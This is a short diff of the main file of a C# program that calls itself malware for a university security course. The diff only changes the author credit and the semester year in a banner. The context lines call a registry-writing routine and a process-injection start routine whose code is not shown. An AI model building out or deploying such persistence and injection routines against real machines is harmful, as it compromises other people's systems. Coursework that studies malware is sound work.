@@ -20,8 +20,8 @@ public class Program
         Console.WriteLine(" )\\____/ `-' )\\____/ |_|  (_) `----'  ");
         Console.WriteLine(" (__)        (__)                      ");
         Console.WriteLine("");
-        Console.WriteLine("[*] created by : peroxidee / 0xilvwrlvs");
-            Console.WriteLine("[*] malware for malware.dev.ciso.csusb(2024[fall]sem)");
+        Console.WriteLine("[*] created by : peroxidee / iluvwerewolves");
+            Console.WriteLine("[*] malware for malware.dev.ciso.csusb(2025[fall]sem)");
         RegEdit.Write();
         // call the write function to write registry key to the registry
         ProcInj.ProcStart();
